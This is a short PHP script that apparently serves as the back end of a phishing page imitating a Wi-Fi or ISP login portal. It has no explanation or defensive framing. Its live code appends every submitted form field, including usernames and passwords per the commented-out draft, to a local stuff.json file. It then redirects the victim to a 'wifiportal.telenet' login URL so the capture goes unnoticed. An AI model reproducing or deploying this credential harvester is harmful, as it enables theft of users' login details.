<?php
  // $current_data = file_get_contents('stuff.json');
  // $array_data = json_decode($current_data, true);
  // $extra_data = array(
  // 'operator' => $POST['operator_'],
  // 'username' => $POST['userName_'],
  // 'password' => $POST['passWord_'],
  // );
  // $array_data = $extra_data;
  // $final_data = json_encode($array_data);
?>
<?php
  $json_string = json_encode($_POST);
  $file_handle = fopen('stuff.json', 'a');
  fwrite($file_handle, $json_string);
  fclose($file_handle);
?>
<script>
  window.location="http://wifiportal.telenet.e/login.html";
</script>
